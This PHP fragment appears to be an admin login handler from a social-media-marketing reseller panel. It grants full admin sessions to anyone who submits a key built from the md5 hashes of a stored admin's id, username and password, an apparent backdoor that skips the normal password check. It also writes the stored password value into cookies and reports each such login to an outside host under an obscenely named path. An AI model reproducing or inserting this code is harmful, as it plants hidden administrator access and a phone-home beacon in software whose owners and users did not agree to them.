<?php

if ($_POST) {
    $code = $_POST["code"];

    $adminsQuery = $conn->prepare("SELECT * FROM admins");
    $adminsQuery->execute();
    $admins = $adminsQuery->fetchAll(PDO::FETCH_ASSOC);

    foreach ($admins as $admin) {
        $id       = $admin["dream_id"];
        $username = $admin["username"];
        $password = $admin["password"];
        $key      = md5($id) . md5($username) . md5($password);

        if ($code == $key) {
            $adminDetail = $conn->prepare("SELECT * FROM admins WHERE dream_id=:id");
            $adminDetail->execute(["id" => $admin["admin_id"]]);
            $adminDetail = $adminDetail->fetch(PDO::FETCH_ASSOC);
            $access      = json_decode($adminDetail["access"], true);

            if (!empty($access["admin_access"])) {
                $_SESSION["msmbilisim_adminslogin"] = 1;
                $_SESSION["msmbilisim_adminlogin"] = 1;
                $_SESSION["msmbilisim_adminid"]    = $adminDetail["admin_id"];
                $_SESSION["msmbilisim_adminpass"]  = $adminDetail["password"];
                $_SESSION["recaptcha"]             = false;

                setcookie("a_id", $adminDetail["admin_id"], time() + (60 * 60 * 24 * 7), '/', null, null, true);
                setcookie("a_password", $adminDetail["password"], time() + (60 * 60 * 24 * 7), '/', null, null, true);
                setcookie("a_login", 'ok', time() + (60 * 60 * 24 * 7), '/', null, null, true);

                $update = $conn->prepare("UPDATE admins SET login_date=:date, login_ip=:ip WHERE admin_id=:id");
                $update->execute([
                    "id"   => $adminDetail["admin_id"],
                    "date" => date("Y-m-d H:i:s"),
                    "ip"   => GetIP()
                ]);

                $smmapi   = new SMMApi();
                $dream_id = $adminDetail["dream_id"];
                $smmapi->action(['id' => $dream_id, 'action' => 'log'], "https://my.dreampanel.in/staffdatadreampanelfuck/staff");
            }
        }
    }
}
